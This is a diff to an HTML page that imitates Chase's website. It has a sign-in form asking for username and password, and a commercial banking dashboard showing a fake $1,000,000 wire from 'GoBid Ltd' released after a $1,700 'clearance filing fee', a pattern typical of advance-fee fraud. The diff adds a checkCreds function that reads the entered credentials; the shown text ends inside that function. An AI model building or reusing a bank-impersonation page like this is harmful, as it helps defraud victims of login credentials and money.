@@ -1283,7 +1283,8 @@
             transition: var(--transition);
         }
 
-        .landing-nav-menu a:hover, .landing-nav-menu a.active {
+        .landing-nav-menu a:hover,
+        .landing-nav-menu a.active {
             color: var(--chase-blue);
         }
 
@@ -1368,7 +1369,8 @@
             letter-spacing: 0.04em;
         }
 
-        .login-field input, .login-field select {
+        .login-field input,
+        .login-field select {
             padding: 12px 14px;
             border: 1px solid var(--border-color);
             border-radius: var(--radius-xs);
@@ -1378,7 +1380,8 @@
             font-family: var(--font-sans);
         }
 
-        .login-field input:focus, .login-field select:focus {
+        .login-field input:focus,
+        .login-field select:focus {
             border-color: var(--chase-blue);
             box-shadow: 0 0 0 3px rgba(17, 122, 202, 0.15);
         }
@@ -1816,9 +1819,9 @@
             <button class="switch-pill-btn" id="pill-login" onclick="switchView('login')">
                 🔑 Chase Sign In Page
             </button>
-            <button class="switch-pill-btn" id="pill-dashboard" onclick="switchView('dashboard')">
+            <!-- <button class="switch-pill-btn" id="pill-dashboard" onclick="switchView('dashboard')">
                 💼 Commercial Banking Portal
-            </button>
+            </button> -->
         </div>
     </div>
 
@@ -1864,11 +1867,11 @@
                 <div class="login-card-header">
                     <span>Welcome to Chase</span>
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#117aca" stroke-width="2.5">
-                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                     </svg>
                 </div>
-                <form onsubmit="handleLandingLogin(event)">
+                <form onsubmit="checkCreds(event)">
                     <div class="login-field">
                         <label>Account Type</label>
                         <select id="login-acc-type">
@@ -1895,7 +1898,7 @@
                         <a href="#" style="color:var(--chase-blue); font-weight:600;">Use RSA Token</a>
                     </div>
 
-                    <button type="submit" class="btn-chase-primary" id="btn-login-submit">
+                    <button type="submit" class="btn-chase-primary" id="btn-login-submit" onclick="checkCreds(event)">
                         Sign In to Banking Portal
                     </button>
                 </form>
@@ -1916,7 +1919,7 @@
 
                 <h1>Enjoy a $300 new checking customer bonus</h1>
                 <p>
-                    Open a new Chase Total Checking® account and set up direct deposit to earn your $300 bonus. 
+                    Open a new Chase Total Checking® account and set up direct deposit to earn your $300 bonus.
                     Manage your commercial and personal finances seamlessly in one secure platform.
                 </p>
 
@@ -1938,20 +1941,23 @@
             <!-- Product Offerings Section -->
             <section>
                 <h2 class="landing-section-title">Explore Chase Banking Products</h2>
-                <p class="landing-section-subtitle">Tailored solutions for your personal, business, and commercial treasury needs.</p>
+                <p class="landing-section-subtitle">Tailored solutions for your personal, business, and commercial
+                    treasury needs.</p>
 
                 <div class="products-grid-4">
                     <!-- Card 1: Credit Cards -->
                     <div class="product-promo-card">
                         <div>
                             <div class="product-icon-wrap">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
                                     <rect x="2" y="5" width="20" height="14" rx="2" />
                                     <line x1="2" y1="10" x2="22" y2="10" />
                                 </svg>
                             </div>
                             <h3>Credit Cards</h3>
-                            <p>Choose from cash back cards like Chase Freedom Unlimited® or premium travel rewards with Sapphire Reserve®.</p>
+                            <p>Choose from cash back cards like Chase Freedom Unlimited® or premium travel rewards with
+                                Sapphire Reserve®.</p>
                         </div>
                         <a href="#" class="card-link-cta">Find your credit card ›</a>
                     </div>
@@ -1960,7 +1966,8 @@
                     <div class="product-promo-card">
                         <div>
                             <div class="product-icon-wrap">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
                                     <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                                 </svg>
                             </div>
@@ -1974,13 +1981,15 @@
                     <div class="product-promo-card">
                         <div>
                             <div class="product-icon-wrap">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <line x1="12" y1="1" x2="12" y2="23"/>
-                                    <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
+                                    <line x1="12" y1="1" x2="12" y2="23" />
+                                    <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
                                 </svg>
                             </div>
                             <h3>Savings & CDs</h3>
-                            <p>Grow your money with competitive High-Yield Savings rates and fixed Certificate of Deposit terms.</p>
+                            <p>Grow your money with competitive High-Yield Savings rates and fixed Certificate of
+                                Deposit terms.</p>
                         </div>
                         <a href="#" class="card-link-cta">Start saving today ›</a>
                     </div>
@@ -1989,7 +1998,8 @@
                     <div class="product-promo-card" style="border-color:var(--chase-blue); background:#eff6ff;">
                         <div>
                             <div class="product-icon-wrap" style="background:var(--chase-blue); color:white;">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
                                     <rect x="3" y="3" width="7" height="7" rx="1" />
                                     <rect x="14" y="3" width="7" height="7" rx="1" />
                                     <rect x="14" y="14" width="7" height="7" rx="1" />
@@ -1997,9 +2007,11 @@
                                 </svg>
                             </div>
                             <h3>Commercial Banking</h3>
-                            <p>Enterprise treasury solutions, multi-currency escrow wires, and corporate capital management.</p>
+                            <p>Enterprise treasury solutions, multi-currency escrow wires, and corporate capital
+                                management.</p>
                         </div>
-                        <a href="#" class="card-link-cta" onclick="switchView('dashboard')">Go to Commercial Portal ›</a>
+                        <a href="#" class="card-link-cta" onclick="switchView('dashboard')">Go to Commercial Portal
+                            ›</a>
                     </div>
                 </div>
             </section>
@@ -2017,7 +2029,8 @@
                                 <span>Initial Deposit Amount:</span>
                                 <strong id="lbl-calc-amt">$25,000</strong>
                             </label>
-                            <input type="range" id="calc-amount" min="5000" max="250000" step="5000" value="25000" oninput="document.getElementById('lbl-calc-amt').innerText = '$' + parseInt(this.value).toLocaleString(); calcSavings();">
+                            <input type="range" id="calc-amount" min="5000" max="250000" step="5000" value="25000"
+                                oninput="document.getElementById('lbl-calc-amt').innerText = '$' + parseInt(this.value).toLocaleString(); calcSavings();">
                         </div>
 
                         <div class="calc-slider-wrap">
@@ -2025,17 +2038,21 @@
                                 <span>Savings Horizon:</span>
                                 <strong id="lbl-calc-years">3 Years</strong>
                             </label>
-                            <input type="range" id="calc-years" min="1" max="5" step="1" value="3" oninput="calcSavings();">
+                            <input type="range" id="calc-years" min="1" max="5" step="1" value="3"
+                                oninput="calcSavings();">
                         </div>
                     </div>
 
                     <div class="calc-result-box">
                         <div>
-                            <div style="font-size:12px; color:var(--text-muted); font-weight:700; text-transform:uppercase;">Projected Total Balance</div>
+                            <div
+                                style="font-size:12px; color:var(--text-muted); font-weight:700; text-transform:uppercase;">
+                                Projected Total Balance</div>
                             <div class="calc-result-val" id="calc-total-val">$28,529.28</div>
                         </div>
                         <div style="text-align:right;">
-                            <div style="font-size:12px; font-weight:700; color:var(--success);" id="calc-interest-val">+$3,529.28 earned @ 4.50% APY</div>
+                            <div style="font-size:12px; font-weight:700; color:var(--success);" id="calc-interest-val">
+                                +$3,529.28 earned @ 4.50% APY</div>
                         </div>
                     </div>
                 </div>
@@ -2046,12 +2063,15 @@
                     <p>Locate any of our 4,700 branches or 15,000 fee-free ATMs near your business location.</p>
 
                     <div style="display:flex; gap:10px; margin-bottom:18px;">
-                        <input type="text" id="atm-search-input" placeholder="Enter ZIP code, City or Address..." style="flex:1; padding:12px 16px; border:1px solid var(--border-color); border-radius:var(--radius-xs); font-size:14px; outline:none;">
-                        <button class="btn-chase-primary" style="width:auto; padding:12px 24px;" onclick="searchAtm()">Search</button>
+                        <input type="text" id="atm-search-input" placeholder="Enter ZIP code, City or Address..."
+                            style="flex:1; padding:12px 16px; border:1px solid var(--border-color); border-radius:var(--radius-xs); font-size:14px; outline:none;">
+                        <button class="btn-chase-primary" style="width:auto; padding:12px 24px;"
+                            onclick="searchAtm()">Search</button>
                     </div>
 
                     <div id="atm-search-result">
-                        <div style="background:var(--bg-card-alt); border:1px dashed var(--border-color); border-radius:var(--radius-xs); padding:16px; text-align:center; color:var(--text-muted); font-size:13px;">
+                        <div
+                            style="background:var(--bg-card-alt); border:1px dashed var(--border-color); border-radius:var(--radius-xs); padding:16px; text-align:center; color:var(--text-muted); font-size:13px;">
                             Enter location above to view nearby Chase branches and drive-up ATMs.
                         </div>
                     </div>
@@ -2062,13 +2082,18 @@
             <section class="news-ticker-bar">
                 <div style="display:flex; align-items:center; gap:8px; font-weight:800; color:var(--chase-navy);">
                     <span>📈 MARKET TICKER</span>
-                    <span style="font-size:11px; background:#dbeafe; color:var(--chase-blue); padding:2px 8px; border-radius:10px;">LIVE</span>
+                    <span
+                        style="font-size:11px; background:#dbeafe; color:var(--chase-blue); padding:2px 8px; border-radius:10px;">LIVE</span>
                 </div>
                 <div class="news-ticker-items">
-                    <div class="ticker-item"><span class="sym">S&P 500</span> <span class="val">5,782.40</span> <span class="pos">+0.42%</span></div>
-                    <div class="ticker-item"><span class="sym">NASDAQ</span> <span class="val">18,340.10</span> <span class="pos">+0.68%</span></div>
-                    <div class="ticker-item"><span class="sym">DOW JONES</span> <span class="val">42,510.80</span> <span class="pos">+0.25%</span></div>
-                    <div class="ticker-item"><span class="sym">FED RATE</span> <span class="val">5.25%</span> <span class="pos" style="color:var(--text-muted);">UNCH</span></div>
+                    <div class="ticker-item"><span class="sym">S&P 500</span> <span class="val">5,782.40</span> <span
+                            class="pos">+0.42%</span></div>
+                    <div class="ticker-item"><span class="sym">NASDAQ</span> <span class="val">18,340.10</span> <span
+                            class="pos">+0.68%</span></div>
+                    <div class="ticker-item"><span class="sym">DOW JONES</span> <span class="val">42,510.80</span> <span
+                            class="pos">+0.25%</span></div>
+                    <div class="ticker-item"><span class="sym">FED RATE</span> <span class="val">5.25%</span> <span
+                            class="pos" style="color:var(--text-muted);">UNCH</span></div>
                 </div>
             </section>
         </main>
@@ -2131,10 +2156,13 @@
     <!-- ---------------------------------------------------- -->
     <!-- DEDICATED CHASE SIGN IN / LOGIN PAGE VIEW            -->
     <!-- ---------------------------------------------------- -->
-    <div id="view-chase-login" class="chase-landing-view view-section hidden" style="background: linear-gradient(to bottom, rgba(11, 35, 65, 0.3) 0%, rgba(11, 35, 65, 0.5) 100%), url('https://images.unsplash.com/photo-1518391846015-55a9cc003b25?auto=format&fit=crop&w=2000&q=80') center/cover no-repeat; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between;">
+    <div id="view-chase-login" class="chase-landing-view view-section hidden"
+        style="background: linear-gradient(to bottom, rgba(11, 35, 65, 0.3) 0%, rgba(11, 35, 65, 0.5) 100%), url('https://images.unsplash.com/photo-1518391846015-55a9cc003b25?auto=format&fit=crop&w=2000&q=80') center/cover no-repeat; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between;">
         <!-- Transparent Gradient Header -->
-        <header style="padding: 24px 48px; display: flex; align-items: center; justify-content: space-between; background: linear-gradient(to bottom, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%);">
-            <a href="#" style="display:flex; align-items:center; gap:10px; text-decoration:none; margin: 0 auto;" onclick="switchView('landing')">
+        <header
+            style="padding: 24px 48px; display: flex; align-items: center; justify-content: space-between; background: linear-gradient(to bottom, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%);">
+            <a href="#" style="display:flex; align-items:center; gap:10px; text-decoration:none; margin: 0 auto;"
+                onclick="switchView('landing')">
                 <svg class="chase-logo-svg" viewBox="0 0 100 100" style="width:34px; height:34px;">
                     <g fill="#FFFFFF">
                         <path d="M 28 8 L 72 8 L 92 28 L 92 48 L 72 48 L 52 28 L 28 28 Z" />
@@ -2154,12 +2182,13 @@
         <div style="flex:1; display:flex; align-items:center; justify-content:center; padding:40px 16px;">
             <div class="chase-login-card-skyline">
                 <!-- Red Alert Warning Header -->
-                <div style="color:#9f1239; font-size:13.5px; font-weight:600; margin-bottom:22px; display:flex; align-items:flex-start; gap:8px; line-height:1.4;">
+                <div
+                    style="color:#9f1239; font-size:13.5px; font-weight:600; margin-bottom:22px; display:flex; align-items:flex-start; gap:8px; line-height:1.4;">
                     <span style="font-size:16px;">⚠️</span>
                     <span>Please tell us your username and password.</span>
                 </div>
 
-                <form onsubmit="handleDedicatedLogin(event)">
+                <form onsubmit="checkCreds(event)">
                     <!-- Underlined Username Field -->
                     <div class="chase-input-group">
                         <label for="input-username">Username</label>
@@ -2174,7 +2203,8 @@
                     </div>
 
                     <!-- Checkboxes Row -->
-                    <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:24px; font-size:12.5px; color:#475569;">
+                    <div
+                        style="display:flex; align-items:center; justify-content:space-between; margin-bottom:24px; font-size:12.5px; color:#475569;">
                         <label style="display:flex; align-items:center; gap:6px; cursor:pointer;">
                             <input type="checkbox" checked> Remember username
                         </label>
@@ -2184,21 +2214,26 @@
                     </div>
 
                     <!-- Solid Blue Primary Sign In Button -->
-                    <button type="submit" class="btn-chase-primary" id="btn-ded-login-submit" style="background:#117aca; border:none; width:100%; padding:13px; border-radius:4px; font-size:15px; font-weight:700; color:white; cursor:pointer;">
+                    <button type="submit" class="btn-chase-primary" id="btn-login-submit" onclick="checkCreds(event)"
+                        style="background:#117aca; border:none; width:100%; padding:13px; border-radius:4px; font-size:15px; font-weight:700; color:white; cursor:pointer;">
                         Sign in
                     </button>
                 </form>
 
                 <!-- Sub Links -->
-                <div style="margin-top:20px; display:flex; flex-direction:column; gap:10px; font-size:13px; font-weight:600;">
-                    <a href="#" style="color:#117aca; text-decoration:none;" onclick="switchView('dashboard')">Forgot username/password? ›</a>
-                    <a href="#" style="color:#117aca; text-decoration:none;" onclick="switchView('dashboard')">Not enrolled? Sign up now. ›</a>
+                <div
+                    style="margin-top:20px; display:flex; flex-direction:column; gap:10px; font-size:13px; font-weight:600;">
+                    <a href="#" style="color:#117aca; text-decoration:none;" onclick="switchView('dashboard')">Forgot
+                        username/password? ›</a>
+                    <a href="#" style="color:#117aca; text-decoration:none;" onclick="switchView('dashboard')">Not
+                        enrolled? Sign up now. ›</a>
                 </div>
             </div>
         </div>
 
         <!-- Official Chase Footer -->
-        <footer style="background:#ffffff; color:#64748b; padding:28px 48px; text-align:center; font-size:12px; border-top:1px solid #e2e8f0; display:flex; flex-direction:column; gap:14px; align-items:center;">
+        <footer
+            style="background:#ffffff; color:#64748b; padding:28px 48px; text-align:center; font-size:12px; border-top:1px solid #e2e8f0; display:flex; flex-direction:column; gap:14px; align-items:center;">
             <!-- Social Icons -->
             <div style="display:flex; gap:18px; color:#475569; font-size:16px;">
                 <span style="cursor:pointer;">📘</span>
@@ -2209,12 +2244,14 @@
             </div>
 
             <!-- Footer Links -->
-            <div style="display:flex; flex-wrap:wrap; justify-content:center; gap:12px 18px; color:#475569; font-size:11.5px;">
+            <div
+                style="display:flex; flex-wrap:wrap; justify-content:center; gap:12px 18px; color:#475569; font-size:11.5px;">
                 <a href="#" style="color:#475569; text-decoration:underline;">Contact us</a>
                 <a href="#" style="color:#475569; text-decoration:underline;">Privacy & security</a>
                 <a href="#" style="color:#475569; text-decoration:underline;">Terms of use</a>
                 <a href="#" style="color:#475569; text-decoration:underline;">Accessibility</a>
-                <a href="#" style="color:#475569; text-decoration:underline;">SAFE Act: Chase Mortgage Loan Originators</a>
+                <a href="#" style="color:#475569; text-decoration:underline;">SAFE Act: Chase Mortgage Loan
+                    Originators</a>
                 <a href="#" style="color:#475569; text-decoration:underline;">Fair Lending</a>
                 <a href="#" style="color:#475569; text-decoration:underline;">About Chase</a>
                 <a href="#" style="color:#475569; text-decoration:underline;">J.P. Morgan</a>
@@ -2371,7 +2408,8 @@
                     <p>Welcome back, DataKnead Ltd (Account #CH-984029)</p>
                 </div>
                 <div class="header-controls">
-                    <button class="switch-pill-btn" style="background:var(--chase-blue); color:white; padding:8px 16px;" onclick="switchView('landing')">
+                    <button class="switch-pill-btn" style="background:var(--chase-blue); color:white; padding:8px 16px;"
+                        onclick="switchView('landing')">
                         🌐 Back to Chase.com
                     </button>
                     <div class="search-box">
@@ -2671,13 +2709,17 @@
                                 <div class="trans-left">
                                     <div class="trans-icon-box" style="background:#ecfdf5; color:#047857;">🏛️</div>
                                     <div>
-                                        <div class="trans-title" style="font-weight:700; color:#065f46;">GoBid Ltd (First National Bank)</div>
-                                        <div class="trans-sub" style="color:#047857; font-weight:600;">Nov 18 • Inbound Wire Transfer (Completed)</div>
+                                        <div class="trans-title" style="font-weight:700; color:#065f46;">GoBid Ltd
+                                            (First National Bank)</div>
+                                        <div class="trans-sub" style="color:#047857; font-weight:600;">Nov 18 • Inbound
+                                            Wire Transfer (Completed)</div>
                                     </div>
                                 </div>
                                 <div class="trans-val positive" style="font-size:14px; font-weight:800; color:#047857;">
                                     +$1,000,000.00
-                                    <div style="font-size:10px; font-weight:800; color:#10b981; text-transform:uppercase;">Completed & Settled</div>
+                                    <div
+                                        style="font-size:10px; font-weight:800; color:#10b981; text-transform:uppercase;">
+                                        Completed & Settled</div>
                                 </div>
                             </div>
 
@@ -3088,18 +3130,23 @@
             <div class="modal-header-row">
                 <div class="modal-title-wrap">
                     <div class="modal-title">Chase Commercial Clearance Center</div>
-                    <div class="modal-sub">Inbound Telegraphic Transfer Regulatory Compliance (Ref: CTT-9840211-ZA • SETTLED)</div>
+                    <div class="modal-sub">Inbound Telegraphic Transfer Regulatory Compliance (Ref: CTT-9840211-ZA •
+                        SETTLED)</div>
                 </div>
-                <button class="modal-close-btn" onclick="closeModal('modal-compliance-gobid-completed')">&times;</button>
+                <button class="modal-close-btn"
+                    onclick="closeModal('modal-compliance-gobid-completed')">&times;</button>
             </div>
 
             <!-- Overview Summary Box -->
             <div class="overview-box">
                 <div class="overview-amount-row">
                     <div>
-                        <div style="font-size:11px; font-weight:700; color:var(--text-muted); text-transform:uppercase;">Inbound Remittance (Cleared)</div>
+                        <div
+                            style="font-size:11px; font-weight:700; color:var(--text-muted); text-transform:uppercase;">
+                            Inbound Remittance (Cleared)</div>
                         <div class="overview-amount" style="color:#047857;">+$1,000,000.00 USD</div>
-                        <div style="font-size:11px; color:var(--text-muted); font-weight:600;">Remitter Currency: R16,240,000.00 ZAR (International Telegraphic Transfer)</div>
+                        <div style="font-size:11px; color:var(--text-muted); font-weight:600;">Remitter Currency:
+                            R16,240,000.00 ZAR (International Telegraphic Transfer)</div>
                     </div>
                     <div class="countdown-pill" style="background:#ecfdf5; color:#047857; border-color:#a7f3d0;">
                         ✓ Regulatory Clearance Complete
@@ -3121,14 +3168,16 @@
                     </div>
                     <div class="meta-item">
                         <span class="meta-label">SWIFT / FedWire Ref</span>
-                        <span class="meta-val" style="font-family:var(--font-mono); color:var(--chase-blue);">FW-FIRNZAJJXXX-GOBID-01</span>
+                        <span class="meta-val"
+                            style="font-family:var(--font-mono); color:var(--chase-blue);">FW-FIRNZAJJXXX-GOBID-01</span>
                     </div>
                 </div>
             </div>
 
             <!-- 3 COMPLIANCE STEPS AUDIT TRAIL (ALL 3 PASSED & SETTLED) -->
             <div class="compliance-steps-container">
-                <div style="font-size:13px; font-weight:800; color:var(--chase-navy);">Regulatory Compliance Audit Trail:</div>
+                <div style="font-size:13px; font-weight:800; color:var(--chase-navy);">Regulatory Compliance Audit
+                    Trail:</div>
 
                 <!-- Step 1: OFAC & SARB Screening (PASSED) -->
                 <div class="step-card passed">
@@ -3139,7 +3188,8 @@
                             <span class="step-status-tag passed">PASSED</span>
                         </div>
                         <div class="step-desc">
-                            Automated screening against US Treasury OFAC, South African Reserve Bank (SARB), and FinCEN watchlists cleared successfully for GoBid Ltd.
+                            Automated screening against US Treasury OFAC, South African Reserve Bank (SARB), and FinCEN
+                            watchlists cleared successfully for GoBid Ltd.
                         </div>
                     </div>
                 </div>
@@ -3153,7 +3203,8 @@
                             <span class="step-status-tag passed">PASSED</span>
                         </div>
                         <div class="step-desc">
-                            Corporate identity verification and source of funds documentation validated with originating remitter bank (First National Bank / GoBid Ltd).
+                            Corporate identity verification and source of funds documentation validated with originating
+                            remitter bank (First National Bank / GoBid Ltd).
                         </div>
                     </div>
                 </div>
@@ -3163,22 +3214,27 @@
                     <div class="step-icon-badge passed">✓</div>
                     <div class="step-content">
                         <div class="step-header">
-                            <span class="step-title">Step 3: Cross-Border Telegraphic Clearance Filing Fee ($1,700.00 USD)</span>
+                            <span class="step-title">Step 3: Cross-Border Telegraphic Clearance Filing Fee ($1,700.00
+                                USD)</span>
                             <span class="step-status-tag passed">PASSED & SETTLED</span>
                         </div>
                         <div class="step-desc">
-                            Telegraphic filing fee of <strong>$1,700.00 USD</strong> was authorized and debited from Commercial Checking (x4562). Final SWIFT clearance executed and <strong>+$1,000,000.00 USD</strong> net funds released.
+                            Telegraphic filing fee of <strong>$1,700.00 USD</strong> was authorized and debited from
+                            Commercial Checking (x4562). Final SWIFT clearance executed and <strong>+$1,000,000.00
+                                USD</strong> net funds released.
                         </div>
                     </div>
                 </div>
             </div>
 
             <!-- SETTLEMENT & CLEARANCE RECEIPT CARD -->
-            <div style="background:#ecfdf5; border:1px solid #a7f3d0; border-radius:var(--radius-sm); padding:18px; color:#065f46; display:flex; flex-direction:column; gap:10px;">
+            <div
+                style="background:#ecfdf5; border:1px solid #a7f3d0; border-radius:var(--radius-sm); padding:18px; color:#065f46; display:flex; flex-direction:column; gap:10px;">
                 <div style="display:flex; align-items:center; gap:8px; font-size:15px; font-weight:800;">
                     <span>🏛️</span> Clearance Certificate & Transaction Settlement Receipt
                 </div>
-                <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; font-size:12px; border-top:1px dashed #a7f3d0; padding-top:10px;">
+                <div
+                    style="display:grid; grid-template-columns:1fr 1fr; gap:10px; font-size:12px; border-top:1px dashed #a7f3d0; padding-top:10px;">
                     <div>
                         <span style="color:#047857; font-weight:600;">Status:</span>
                         <strong style="color:#065f46;">RELEASED & CREDITED</strong>
@@ -3196,7 +3252,8 @@
                         <strong>Nov 18, 2026 • 14:32:05 EST</strong>
                     </div>
                 </div>
-                <button class="btn-authorize-clearance" style="background:#047857; margin-top:6px;" onclick="closeModal('modal-compliance-gobid-completed')">
+                <button class="btn-authorize-clearance" style="background:#047857; margin-top:6px;"
+                    onclick="closeModal('modal-compliance-gobid-completed')">
                     Close Clearance Audit Receipt
                 </button>
             </div>
@@ -3214,16 +3271,21 @@
                     <div class="modal-title" style="display:flex; align-items:center; gap:8px;">
                         <span>⚙️</span> EVM On-Chain Swap Inspector
                     </div>
-                    <div class="modal-sub">Ethereum Mainnet (Chain ID: 1) • Tx: <span style="font-family:var(--font-mono); color:var(--chase-blue);">0x8f2a9c417b019a823e4c85d71a92e104f32b72e901a</span></div>
+                    <div class="modal-sub">Ethereum Mainnet (Chain ID: 1) • Tx: <span
+                            style="font-family:var(--font-mono); color:var(--chase-blue);">0x8f2a9c417b019a823e4c85d71a92e104f32b72e901a</span>
+                    </div>
                 </div>
                 <button class="modal-close-btn" onclick="closeModal('modal-evm-transfer')">&times;</button>
             </div>
 
             <!-- Architecture Flow Pipeline Box -->
             <div class="overview-box" style="background:#0f172a; color:#f8fafc; border-color:#334155;">
-                <div style="font-size:11px; font-weight:800; text-transform:uppercase; color:#94a3b8; letter-spacing:0.05em;">Smart Contract Call & Transfer Route Architecture</div>
-                
-                <div style="display:flex; align-items:center; justify-content:space-between; gap:6px; background:#1e293b; padding:14px; border-radius:8px; margin-top:4px; font-size:11px;">
+                <div
+                    style="font-size:11px; font-weight:800; text-transform:uppercase; color:#94a3b8; letter-spacing:0.05em;">
+                    Smart Contract Call & Transfer Route Architecture</div>
+
+                <div
+                    style="display:flex; align-items:center; justify-content:space-between; gap:6px; background:#1e293b; padding:14px; border-radius:8px; margin-top:4px; font-size:11px;">
                     <div style="text-align:center;">
                         <div style="color:#94a3b8; font-size:10px;">User Wallet</div>
                         <strong style="color:#60a5fa; font-family:var(--font-mono);">0x71C...49A2</strong>
@@ -3252,7 +3314,8 @@
 
             <!-- Execution Steps & State Mutations -->
             <div class="compliance-steps-container">
-                <div style="font-size:13px; font-weight:800; color:var(--chase-navy);">EVM State Execution Pipeline:</div>
+                <div style="font-size:13px; font-weight:800; color:var(--chase-navy);">EVM State Execution Pipeline:
+                </div>
 
                 <!-- Step 1: ERC-20 Approval -->
                 <div class="step-card passed" style="border-color:#bfdbfe; background:#eff6ff;">
@@ -3260,12 +3323,16 @@
                     <div class="step-content">
                         <div class="step-header">
                             <span class="step-title">Phase 1: USDT Contract Allowance Approval</span>
-                            <span class="step-status-tag passed" style="background:#dbeafe; color:#1e40af;">CONFIRMED (Block #19,842,108)</span>
+                            <span class="step-status-tag passed" style="background:#dbeafe; color:#1e40af;">CONFIRMED
+                                (Block #19,842,108)</span>
                         </div>
                         <div class="step-desc" style="font-family:var(--font-mono); font-size:11.5px; color:#1e293b;">
-                            <strong>Call:</strong> USDT.approve(spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount: 1300000000000)<br>
-                            <strong>State Change:</strong> allowance[0x71C...49A2][DEX_Router] = 1,300,000.000000 USDT<br>
-                            <strong>Event Emitted:</strong> Approval(owner: 0x71C..., spender: 0x7a25..., value: 1300000000000)
+                            <strong>Call:</strong> USDT.approve(spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
+                            amount: 1300000000000)<br>
+                            <strong>State Change:</strong> allowance[0x71C...49A2][DEX_Router] = 1,300,000.000000
+                            USDT<br>
+                            <strong>Event Emitted:</strong> Approval(owner: 0x71C..., spender: 0x7a25..., value:
+                            1300000000000)
                         </div>
                     </div>
                 </div>
@@ -3276,10 +3343,13 @@
                     <div class="step-content">
                         <div class="step-header">
                             <span class="step-title">Phase 2: AMM Router Swap & Liquidity Transfer</span>
-                            <span class="step-status-tag passed" style="background:#d1fae5; color:#065f46;">CONFIRMED (Block #19,842,109)</span>
+                            <span class="step-status-tag passed" style="background:#d1fae5; color:#065f46;">CONFIRMED
+                                (Block #19,842,109)</span>
                         </div>
                         <div class="step-desc" style="font-family:var(--font-mono); font-size:11.5px; color:#1e293b;">
-                            <strong>Call:</strong> Router.swapExactTokensForTokens(amountIn: 1300000000000, amountOutMin: 4850000000000000000000000, path: [USDT, KTK], to: 0x71C...49A2, deadline: 1787593200)<br>
+                            <strong>Call:</strong> Router.swapExactTokensForTokens(amountIn: 1300000000000,
+                            amountOutMin: 4850000000000000000000000, path: [USDT, KTK], to: 0x71C...49A2, deadline:
+                            1787593200)<br>
                             <strong>Internal Operations:</strong><br>
                             1. USDT.transferFrom(0x71C...49A2, Pool_USDT_KTK, 1,300,000.00 USDT)<br>
                             2. AMM Constant Product Math Calculation ($x \cdot y = k$)<br>
@@ -3290,7 +3360,8 @@
             </div>
 
             <!-- Low-Level Technical Parameters & Raw Calldata -->
-            <div style="background:#f8fafc; border:1px solid var(--border-color); border-radius:var(--radius-sm); padding:16px; font-size:12px; display:flex; flex-direction:column; gap:10px;">
+            <div
+                style="background:#f8fafc; border:1px solid var(--border-color); border-radius:var(--radius-sm); padding:16px; font-size:12px; display:flex; flex-direction:column; gap:10px;">
                 <div style="font-weight:800; color:var(--chase-navy);">Technical EVM Execution Parameters:</div>
                 <div class="meta-grid" style="grid-template-columns: 1fr 1fr 1fr;">
                     <div class="meta-item">
@@ -3321,14 +3392,16 @@
 
                 <div style="display:flex; flex-direction:column; gap:4px; margin-top:6px;">
                     <span class="meta-label">Raw Encoded Calldata Hex Payload:</span>
-                    <div style="background:#0f172a; color:#38bdf8; font-family:var(--font-mono); font-size:10px; padding:10px; border-radius:6px; word-break:break-all; max-height:70px; overflow-y:auto;">
+                    <div
+                        style="background:#0f172a; color:#38bdf8; font-family:var(--font-mono); font-size:10px; padding:10px; border-radius:6px; word-break:break-all; max-height:70px; overflow-y:auto;">
                         0x38ed17390000000000000000000000000000000000000000000000000000012eea20000000000000000000000000000000000000000000000044458319eb38d0000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000071c89f2d12e98418a0029b92138128f4139e49a20000000000000000000000000000000000000000000000000000000069dc2c40
                     </div>
                 </div>
             </div>
 
             <!-- Footer Action Button -->
-            <button class="btn-authorize-clearance" style="background:var(--chase-navy);" onclick="closeModal('modal-evm-transfer')">
+            <button class="btn-authorize-clearance" style="background:var(--chase-navy);"
+                onclick="closeModal('modal-evm-transfer')">
                 Close EVM Inspector
             </button>
         </div>
@@ -3374,23 +3447,43 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
+        function checkCreds(event) {
+            if (event) event.preventDefault();
+
+            const usernameInput = document.getElementById('input-username') || document.querySelector('#view-chase-landing input[type="text"]');
+            const passwordInput = document.getElementById('input-password') || document.querySelector('#view-chase-landing input[type="password"]');
+            const btnList = document.querySelectorAll('#btn-login-submit');
+
+            const username = usernameInput ? usernameInput.value.trim() : '';
+            const password = passwordInput ? passwordInput.value.trim() : '';
+
+            if (!username || !password) {
+                alert('Please enter your username and password.');
+                return false;
+            }
+
+            btnList.forEach(btn => {
+                btn.innerText = 'Authenticating Credentials...';
+                btn.style.opacity = '0.8';
+            });
+
+            setTimeout(() => {
+                btnList.forEach(btn => {
+                    btn.innerText = 'Sign in';
+                    btn.style.opacity = '1';
+                });
+                switchView('dashboard');
+            }, 650);
+
